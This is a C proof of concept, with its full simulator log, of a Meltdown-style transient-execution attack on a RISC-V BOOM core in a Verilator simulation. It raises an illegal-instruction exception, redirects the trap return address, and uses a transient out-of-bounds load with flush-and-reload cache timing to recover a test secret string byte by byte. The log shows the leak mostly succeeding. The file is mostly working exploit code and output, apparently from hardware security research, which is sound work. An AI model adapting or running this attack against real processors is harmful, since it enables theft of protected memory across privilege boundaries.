#include <stdio.h>
#include <stdint.h> 
#include "encoding.h"
#include "cache.h"

#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
#define SECRET_SZ 26
#define CACHE_HIT_THRESHOLD 50

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];

char* secretString = "!\"#ThisIsTheBabyBoomerTest";


/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray)
{
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i)
    {
        if (inArray[i] > outValArray[0])
        {
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1])
        {
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}


//setup an exception handler
static inline unsigned long readfcsr()
{
    unsigned long  val;
    asm volatile("frcsr %0" : "=r"(val));
    return val;
}


static inline unsigned long long readmcause()
{
    unsigned long long  val;
    asm volatile("csrr %0, mcause" : "=r"(val));
    return val;
}


void handle_trap(uintptr_t cause, uintptr_t epc, uintptr_t regs[32])
{
    if(readmcause() == 0x2)  //illegal instruction
    {
        //save the redirect PC to a0, trap_entry in crt.s will reset the mepc with the a0 
        epc += 72;  //17*4 +2
        asm ("mv a0, %0 \n" : :"r" (epc));
    }
}


/*
    The following table lists the RISC-V instruction formats that are available with the ‘.insn’ pseudo directive:

    R type: .insn r opcode, func3, func7, rd, rs1, rs2
    +-------+-----+-----+-------+----+-------------+
    | func7 | rs2 | rs1 | func3 | rd |  opcode (7) |
    +-------+-----+-----+-------+----+-------------+
    31      25    20    15      12   7             0

    R type with 4 register operands: .insn r opcode, func3, func2, rd, rs1, rs2, rs3
    R4 type: .insn r4 opcode, func3, func2, rd, rs1, rs2, rs3
    +-----+-------+-----+-----+-------+----+-------------+
    | rs3 | func2 | rs2 | rs1 | func3 | rd |      opcode |
    +-----+-------+-----+-----+-------+----+-------------+
    31    27      25    20    15      12   7             0

    I type: .insn i opcode, func3, rd, rs1, simm12
    +-------------+-----+-------+----+-------------+
    |      simm12 | rs1 | func3 | rd |      opcode |
    +-------------+-----+-------+----+-------------+
    31            20    15      12   7             0

    S type: .insn s opcode, func3, rd, rs1, simm12
    +--------------+-----+-----+-------+-------------+-------------+
    | simm12[11:5] | rs2 | rs1 | func3 | simm12[4:0] |      opcode |
    +--------------+-----+-----+-------+-------------+-------------+
    31             25    20    15      12            7             0

    SB type: .insn sb opcode, func3, rd, rs1, symbol
    SB type: .insn sb opcode, func3, rd, simm12(rs1)
    B type: .insn s opcode, func3, rd, rs1, symbol
    B type: .insn s opcode, func3, rd, simm12(rs1)
    +------------+--------------+-----+-----+-------+-------------+-------------+--------+
    | simm12[12] | simm12[10:5] | rs2 | rs1 | func3 | simm12[4:1] | simm12[11]] | opcode |
    +------------+--------------+-----+-----+-------+-------------+-------------+--------+
    31          30            25    20    15      12           7            0

    U type: .insn u opcode, rd, simm20
    +---------------------------+----+-------------+
    |                    simm20 | rd |      opcode |
    +---------------------------+----+-------------+
    31                          12   7             0

    UJ type: .insn uj opcode, rd, symbol
    J type: .insn j opcode, rd, symbol
    +------------+--------------+------------+---------------+----+-------------+
    | simm20[20] | simm20[10:1] | simm20[11] | simm20[19:12] | rd |      opcode |
    +------------+--------------+------------+---------------+----+-------------+
    31           30             21           20              12   7             0

    CR type: .insn cr opcode2, func4, rd, rs2
    +---------+--------+-----+---------+
    |   func4 | rd/rs1 | rs2 | opcode2 |
    +---------+--------+-----+---------+
    15        12       7     2        0

    CI type: .insn ci opcode2, func3, rd, simm6
    +---------+-----+--------+-----+---------+
    |   func3 | imm | rd/rs1 | imm | opcode2 |
    +---------+-----+--------+-----+---------+
    15        13    12       7     2         0

    CIW type: .insn ciw opcode2, func3, rd, uimm8
    +---------+--------------+-----+---------+
    |   func3 |          imm | rd' | opcode2 |
    +---------+--------------+-----+---------+
    15        13             7     2         0

    CA type: .insn ca opcode2, func6, func2, rd, rs2
    +---------+----------+-------+------+--------+
    |   func6 | rd'/rs1' | func2 | rs2' | opcode |
    +---------+----------+-------+------+--------+
    15        10         7       5      2        0

    CB type: .insn cb opcode2, func3, rs1, symbol
    +---------+--------+------+--------+---------+
    |   func3 | offset | rs1' | offset | opcode2 |
    +---------+--------+------+--------+---------+
    15        13       10     7        2         0

    CJ type: .insn cj opcode2, symbol
    +---------+--------------------+---------+
    |   func3 |        jump target | opcode2 |
    +---------+--------------------+---------+
    15        13             7     2         0
*/

uint64_t   temp = 0;
uint8_t    dummy = 2;
#define BADADDR 0x100000000
long       ptr=BADADDR;

void victim_function(uint64_t idx, uint64_t iRound)
{ 
    int out = 0, in = 0;
    // create a speculative window by doing div operations
    asm("addi t1, zero, 2 \n"
        "slli t2, t1, 0x4 \n"
        "fcvt.s.lu fa4, t1 \n"
        "fcvt.s.lu fa5, t2 \n"
        "fdiv.s fa5, fa5, fa4 \n"
        "fdiv.s fa5, fa5, fa4 \n"
        "fdiv.s fa5, fa5, fa4 \n"
        "fdiv.s fa5, fa5, fa4 \n"
        "fcvt.lu.s t2, fa5, rtz \n");
/*
    R type: .insn r opcode(7), func3(3), func7(7), rd(5), rs1(5), rs2(5)
    +-------+-----+-----+-------+----+-------------+
    | func7 | rs2 | rs1 | func3 | rd |  opcode (7) |
    +-------+-----+-----+-------+----+-------------+
    31    25    20    15      12    7             0

    custom-0: 00 010 xx
    custom-1: 01 010 xx
    custom-2: 10 110 xx
    custom-3: 11 110 xx 
*/
    // create an exception,in the exception handler to redirect the epc
    // asm volatile(".insn r 0x7b, 6, 6, %0, %1, x0" : "=r"(out) : "r"(in));  //custom-3, attack failed
    asm volatile(".insn r 0x0b, 6, 6, %0, %1, x0" : "=r"(out) : "r"(in));     //custom-0, attack failed
    temp = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    // bound speculation here just in case it goes over
    printf("print1: skip to next statement in the exception handler, something is wrong\n");	    
    dummy = rdcycle();
    printf("print2: idx=%lu, iRound=%lu \n", idx, iRound);
}


int main(void)
{
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t start, diff;
    static uint64_t results[256];

    printf("================= This is a POC of Meltdown (zero division exception) ========================= \n");
    printf("the secret key is:%s \n", secretString);

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len)
	{

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx)
		{
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound)
		{

            // make sure array you read from is not in the cache
            flushCache((uint64_t)array2, sizeof(array2));
            victim_function(attackIdx, atkRound);
            
            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i)
            {
                uint64_t  uiTemp = 0;  //introduced a dummy variable to prevent compiler optimizations
                start = rdcycle();
                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
                diff = (rdcycle() - start);

                if ( diff < CACHE_HIT_THRESHOLD )
				{
					printf("len=%ld, atkRound=%ld, add 1 to results[%ld], diff=%lu \n", len, atkRound, i, diff);
                    results[i] += 1;
                }
            }
        }
        
        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        printf("len=%ld m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c) \n", len, (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 

        // read in the next secret 
        ++attackIdx;
    }

    return 0;
}


/*================================================== the complete log =================================================*/
/* 
shawnliu@shawnliu-Aspire-TC-780:/media/shawnliu/AI_DISK/sonicboom/chipyard/sims/verilator$ ./simulator-chipyard-SmallBoomConfig ./invalidAddrException.riscv
This emulator compiled with JTAG Remote Bitbang client. To enable, use +jtag_rbb_enable=1.
Listening on port 37337
[UART] UART0 is here (stdin/stdout).
================= This is a POC of Meltdown (zero division exception) ========================= 
the secret key is:!"#ThisIsTheBabyBoomerTest 
print2: idx=18446744073709550824, iRound=0 
print2: idx=18446744073709550824, iRound=1 
print2: idx=18446744073709550824, iRound=2 
print2: idx=18446744073709550824, iRound=3 
print2: idx=18446744073709550824, iRound=4 
print2: idx=18446744073709550824, iRound=5 
print2: idx=18446744073709550824, iRound=6 
print2: idx=18446744073709550824, iRound=7 
print2: idx=18446744073709550824, iRound=8 
print2: idx=18446744073709550824, iRound=9 
len=0 m[0x0x80002728] = want(!) =?= guess(hits,dec,char) 1.(7, 33, !) 2.(2, 53, 5) 
print2: idx=18446744073709550825, iRound=0 
print2: idx=18446744073709550825, iRound=1 
print2: idx=18446744073709550825, iRound=2 
print2: idx=18446744073709550825, iRound=3 
print2: idx=18446744073709550825, iRound=4 
print2: idx=18446744073709550825, iRound=5 
print2: idx=18446744073709550825, iRound=6 
print2: idx=18446744073709550825, iRound=7 
print2: idx=18446744073709550825, iRound=8 
print2: idx=18446744073709550825, iRound=9 
) n=1 m[0x0x80002729] = want(") =?= guess(hits,dec,char) 1.(6, 34, ") 2.(1, 13, 
print2: idx=18446744073709550826, iRound=0 
print2: idx=18446744073709550826, iRound=1 
print2: idx=18446744073709550826, iRound=2 
print2: idx=18446744073709550826, iRound=3 
print2: idx=18446744073709550826, iRound=4 
print2: idx=18446744073709550826, iRound=5 
print2: idx=18446744073709550826, iRound=6 
print2: idx=18446744073709550826, iRound=7 
print2: idx=18446744073709550826, iRound=8 
print2: idx=18446744073709550826, iRound=9 
len=2 m[0x0x8000272a] = want(#) =?= guess(hits,dec,char) 1.(9, 35, #) 2.(1, 12, 
                                                                                ) 
print2: idx=18446744073709550827, iRound=0 
print2: idx=18446744073709550827, iRound=1 
print2: idx=18446744073709550827, iRound=2 
print2: idx=18446744073709550827, iRound=3 
print2: idx=18446744073709550827, iRound=4 
print2: idx=18446744073709550827, iRound=5 
print2: idx=18446744073709550827, iRound=6 
print2: idx=18446744073709550827, iRound=7 
print2: idx=18446744073709550827, iRound=8 
print2: idx=18446744073709550827, iRound=9 
len=3 m[0x0x8000272b] = want(T) =?= guess(hits,dec,char) 1.(5, 84, T) 2.(1, 3, ) 
print2: idx=18446744073709550828, iRound=0 
print2: idx=18446744073709550828, iRound=1 
print2: idx=18446744073709550828, iRound=2 
print2: idx=18446744073709550828, iRound=3 
print2: idx=18446744073709550828, iRound=4 
print2: idx=18446744073709550828, iRound=5 
print2: idx=18446744073709550828, iRound=6 
print2: idx=18446744073709550828, iRound=7 
print2: idx=18446744073709550828, iRound=8 
print2: idx=18446744073709550828, iRound=9 
len=4 m[0x0x8000272c] = want(h) =?= guess(hits,dec,char) 1.(10, 104, h) 2.(1, 7, ) 
print2: idx=18446744073709550829, iRound=0 
print2: idx=18446744073709550829, iRound=1 
print2: idx=18446744073709550829, iRound=2 
print2: idx=18446744073709550829, iRound=3 
print2: idx=18446744073709550829, iRound=4 
print2: idx=18446744073709550829, iRound=5 
print2: idx=18446744073709550829, iRound=6 
print2: idx=18446744073709550829, iRound=7 
print2: idx=18446744073709550829, iRound=8 
print2: idx=18446744073709550829, iRound=9 
len=5 m[0x0x8000272d] = want(i) =?= guess(hits,dec,char) 1.(7, 105, i) 2.(2, 54, 6) 
print2: idx=18446744073709550830, iRound=0 
print2: idx=18446744073709550830, iRound=1 
print2: idx=18446744073709550830, iRound=2 
print2: idx=18446744073709550830, iRound=3 
print2: idx=18446744073709550830, iRound=4 
print2: idx=18446744073709550830, iRound=5 
print2: idx=18446744073709550830, iRound=6 
print2: idx=18446744073709550830, iRound=7 
print2: idx=18446744073709550830, iRound=8 
print2: idx=18446744073709550830, iRound=9 
len=6 m[0x0x8000272e] = want(s) =?= guess(hits,dec,char) 1.(7, 115, s) 2.(1, 15, ) 
print2: idx=18446744073709550831, iRound=0 
print2: idx=18446744073709550831, iRound=1 
print2: idx=18446744073709550831, iRound=2 
print2: idx=18446744073709550831, iRound=3 
print2: idx=18446744073709550831, iRound=4 
print2: idx=18446744073709550831, iRound=5 
print2: idx=18446744073709550831, iRound=6 
print2: idx=18446744073709550831, iRound=7 
print2: idx=18446744073709550831, iRound=8 
print2: idx=18446744073709550831, iRound=9 
len=7 m[0x0x8000272f] = want(I) =?= guess(hits,dec,char) 1.(7, 73, I) 2.(2, 118, v) 
print2: idx=18446744073709550832, iRound=0 
print2: idx=18446744073709550832, iRound=1 
print2: idx=18446744073709550832, iRound=2 
print2: idx=18446744073709550832, iRound=3 
print2: idx=18446744073709550832, iRound=4 
print2: idx=18446744073709550832, iRound=5 
print2: idx=18446744073709550832, iRound=6 
print2: idx=18446744073709550832, iRound=7 
print2: idx=18446744073709550832, iRound=8 
print2: idx=18446744073709550832, iRound=9 
len=8 m[0x0x80002730] = want(s) =?= guess(hits,dec,char) 1.(7, 115, s) 2.(1, 34, ") 
print2: idx=18446744073709550833, iRound=0 
print2: idx=18446744073709550833, iRound=1 
print2: idx=18446744073709550833, iRound=2 
print2: idx=18446744073709550833, iRound=3 
print2: idx=18446744073709550833, iRound=4 
print2: idx=18446744073709550833, iRound=5 
print2: idx=18446744073709550833, iRound=6 
print2: idx=18446744073709550833, iRound=7 
print2: idx=18446744073709550833, iRound=8 
print2: idx=18446744073709550833, iRound=9 
len=9 m[0x0x80002731] = want(T) =?= guess(hits,dec,char) 1.(3, 84, T) 2.(2, 246, �) 
print2: idx=18446744073709550834, iRound=0 
print2: idx=18446744073709550834, iRound=1 
print2: idx=18446744073709550834, iRound=2 
print2: idx=18446744073709550834, iRound=3 
print2: idx=18446744073709550834, iRound=4 
print2: idx=18446744073709550834, iRound=5 
print2: idx=18446744073709550834, iRound=6 
print2: idx=18446744073709550834, iRound=7 
print2: idx=18446744073709550834, iRound=8 
print2: idx=18446744073709550834, iRound=9 
len=10 m[0x0x80002732] = want(h) =?= guess(hits,dec,char) 1.(8, 104, h) 2.(2, 129, �) 
print2: idx=18446744073709550835, iRound=0 
print2: idx=18446744073709550835, iRound=1 
print2: idx=18446744073709550835, iRound=2 
print2: idx=18446744073709550835, iRound=3 
print2: idx=18446744073709550835, iRound=4 
print2: idx=18446744073709550835, iRound=5 
print2: idx=18446744073709550835, iRound=6 
print2: idx=18446744073709550835, iRound=7 
print2: idx=18446744073709550835, iRound=8 
print2: idx=18446744073709550835, iRound=9 
len=11 m[0x0x80002733] = want(e) =?= guess(hits,dec,char) 1.(8, 101, e) 2.(1, 35, #) 
print2: idx=18446744073709550836, iRound=0 
print2: idx=18446744073709550836, iRound=1 
print2: idx=18446744073709550836, iRound=2 
print2: idx=18446744073709550836, iRound=3 
print2: idx=18446744073709550836, iRound=4 
print2: idx=18446744073709550836, iRound=5 
print2: idx=18446744073709550836, iRound=6 
print2: idx=18446744073709550836, iRound=7 
print2: idx=18446744073709550836, iRound=8 
print2: idx=18446744073709550836, iRound=9 
len=12 m[0x0x80002734] = want(B) =?= guess(hits,dec,char) 1.(8, 66, B) 2.(3, 224, �) 
print2: idx=18446744073709550837, iRound=0 
print2: idx=18446744073709550837, iRound=1 
print2: idx=18446744073709550837, iRound=2 
print2: idx=18446744073709550837, iRound=3 
print2: idx=18446744073709550837, iRound=4 
print2: idx=18446744073709550837, iRound=5 
print2: idx=18446744073709550837, iRound=6 
print2: idx=18446744073709550837, iRound=7 
print2: idx=18446744073709550837, iRound=8 
print2: idx=18446744073709550837, iRound=9 
len=13 m[0x0x80002735] = want(a) =?= guess(hits,dec,char) 1.(8, 97, a) 2.(1, 93, ]) 
print2: idx=18446744073709550838, iRound=0 
print2: idx=18446744073709550838, iRound=1 
print2: idx=18446744073709550838, iRound=2 
print2: idx=18446744073709550838, iRound=3 
print2: idx=18446744073709550838, iRound=4 
print2: idx=18446744073709550838, iRound=5 
print2: idx=18446744073709550838, iRound=6 
print2: idx=18446744073709550838, iRound=7 
print2: idx=18446744073709550838, iRound=8 
print2: idx=18446744073709550838, iRound=9 
len=14 m[0x0x80002736] = want(b) =?= guess(hits,dec,char) 1.(5, 98, b) 2.(1, 14, ) 
print2: idx=18446744073709550839, iRound=0 
print2: idx=18446744073709550839, iRound=1 
print2: idx=18446744073709550839, iRound=2 
print2: idx=18446744073709550839, iRound=3 
print2: idx=18446744073709550839, iRound=4 
print2: idx=18446744073709550839, iRound=5 
print2: idx=18446744073709550839, iRound=6 
print2: idx=18446744073709550839, iRound=7 
print2: idx=18446744073709550839, iRound=8 
print2: idx=18446744073709550839, iRound=9 
len=15 m[0x0x80002737] = want(y) =?= guess(hits,dec,char) 1.(6, 121, y) 2.(2, 241, �) 
print2: idx=18446744073709550840, iRound=0 
print2: idx=18446744073709550840, iRound=1 
print2: idx=18446744073709550840, iRound=2 
print2: idx=18446744073709550840, iRound=3 
print2: idx=18446744073709550840, iRound=4 
print2: idx=18446744073709550840, iRound=5 
print2: idx=18446744073709550840, iRound=6 
print2: idx=18446744073709550840, iRound=7 
print2: idx=18446744073709550840, iRound=8 
print2: idx=18446744073709550840, iRound=9 
len=16 m[0x0x80002738] = want(B) =?= guess(hits,dec,char) 1.(8, 66, B) 2.(1, 0, ) 
print2: idx=18446744073709550841, iRound=0 
print2: idx=18446744073709550841, iRound=1 
print2: idx=18446744073709550841, iRound=2 
print2: idx=18446744073709550841, iRound=3 
print2: idx=18446744073709550841, iRound=4 
print2: idx=18446744073709550841, iRound=5 
print2: idx=18446744073709550841, iRound=6 
print2: idx=18446744073709550841, iRound=7 
print2: idx=18446744073709550841, iRound=8 
print2: idx=18446744073709550841, iRound=9 
len=17 m[0x0x80002739] = want(o) =?= guess(hits,dec,char) 1.(5, 111, o) 2.(2, 94, ^) 
print2: idx=18446744073709550842, iRound=0 
print2: idx=18446744073709550842, iRound=1 
print2: idx=18446744073709550842, iRound=2 
print2: idx=18446744073709550842, iRound=3 
print2: idx=18446744073709550842, iRound=4 
print2: idx=18446744073709550842, iRound=5 
print2: idx=18446744073709550842, iRound=6 
print2: idx=18446744073709550842, iRound=7 
print2: idx=18446744073709550842, iRound=8 
print2: idx=18446744073709550842, iRound=9 
len=18 m[0x0x8000273a] = want(o) =?= guess(hits,dec,char) 1.(10, 111, o) 2.(2, 245, �) 
print2: idx=18446744073709550843, iRound=0 
print2: idx=18446744073709550843, iRound=1 
print2: idx=18446744073709550843, iRound=2 
print2: idx=18446744073709550843, iRound=3 
print2: idx=18446744073709550843, iRound=4 
print2: idx=18446744073709550843, iRound=5 
print2: idx=18446744073709550843, iRound=6 
print2: idx=18446744073709550843, iRound=7 
print2: idx=18446744073709550843, iRound=8 
print2: idx=18446744073709550843, iRound=9 
len=19 m[0x0x8000273b] = want(m) =?= guess(hits,dec,char) 1.(2, 118, v) 2.(1, 2, ) 
print2: idx=18446744073709550844, iRound=0 
print2: idx=18446744073709550844, iRound=1 
print2: idx=18446744073709550844, iRound=2 
print2: idx=18446744073709550844, iRound=3 
print2: idx=18446744073709550844, iRound=4 
print2: idx=18446744073709550844, iRound=5 
print2: idx=18446744073709550844, iRound=6 
print2: idx=18446744073709550844, iRound=7 
print2: idx=18446744073709550844, iRound=8 
print2: idx=18446744073709550844, iRound=9 
len=20 m[0x0x8000273c] = want(e) =?= guess(hits,dec,char) 1.(7, 101, e) 2.(2, 64, @) 
print2: idx=18446744073709550845, iRound=0 
print2: idx=18446744073709550845, iRound=1 
print2: idx=18446744073709550845, iRound=2 
print2: idx=18446744073709550845, iRound=3 
print2: idx=18446744073709550845, iRound=4 
print2: idx=18446744073709550845, iRound=5 
print2: idx=18446744073709550845, iRound=6 
print2: idx=18446744073709550845, iRound=7 
print2: idx=18446744073709550845, iRound=8 
print2: idx=18446744073709550845, iRound=9 
len=21 m[0x0x8000273d] = want(r) =?= guess(hits,dec,char) 1.(7, 114, r) 2.(2, 46, .) 
print2: idx=18446744073709550846, iRound=0 
print2: idx=18446744073709550846, iRound=1 
print2: idx=18446744073709550846, iRound=2 
print2: idx=18446744073709550846, iRound=3 
print2: idx=18446744073709550846, iRound=4 
print2: idx=18446744073709550846, iRound=5 
print2: idx=18446744073709550846, iRound=6 
print2: idx=18446744073709550846, iRound=7 
print2: idx=18446744073709550846, iRound=8 
print2: idx=18446744073709550846, iRound=9 
len=22 m[0x0x8000273e] = want(T) =?= guess(hits,dec,char) 1.(7, 84, T) 2.(2, 72, H) 
print2: idx=18446744073709550847, iRound=0 
print2: idx=18446744073709550847, iRound=1 
print2: idx=18446744073709550847, iRound=2 
print2: idx=18446744073709550847, iRound=3 
print2: idx=18446744073709550847, iRound=4 
print2: idx=18446744073709550847, iRound=5 
print2: idx=18446744073709550847, iRound=6 
print2: idx=18446744073709550847, iRound=7 
print2: idx=18446744073709550847, iRound=8 
print2: idx=18446744073709550847, iRound=9 
len=23 m[0x0x8000273f] = want(e) =?= guess(hits,dec,char) 1.(8, 101, e) 2.(2, 167, �) 
print2: idx=18446744073709550848, iRound=0 
print2: idx=18446744073709550848, iRound=1 
print2: idx=18446744073709550848, iRound=2 
print2: idx=18446744073709550848, iRound=3 
print2: idx=18446744073709550848, iRound=4 
print2: idx=18446744073709550848, iRound=5 
print2: idx=18446744073709550848, iRound=6 
print2: idx=18446744073709550848, iRound=7 
print2: idx=18446744073709550848, iRound=8 
print2: idx=18446744073709550848, iRound=9 
len=24 m[0x0x80002740] = want(s) =?= guess(hits,dec,char) 1.(9, 115, s) 2.(1, 6, ) 
print2: idx=18446744073709550849, iRound=0 
print2: idx=18446744073709550849, iRound=1 
print2: idx=18446744073709550849, iRound=2 
print2: idx=18446744073709550849, iRound=3 
print2: idx=18446744073709550849, iRound=4 
print2: idx=18446744073709550849, iRound=5 
print2: idx=18446744073709550849, iRound=6 
print2: idx=18446744073709550849, iRound=7 
print2: idx=18446744073709550849, iRound=8 
print2: idx=18446744073709550849, iRound=9 
len=25 m[0x0x80002741] = want(t) =?= guess(hits,dec,char) 1.(8, 116, t) 2.(1, 15, ) 
shawnliu@shawnliu-Aspire-TC-780:/media/shawnliu/AI_DISK/sonicboom/chipyard/sims/verilator$

*/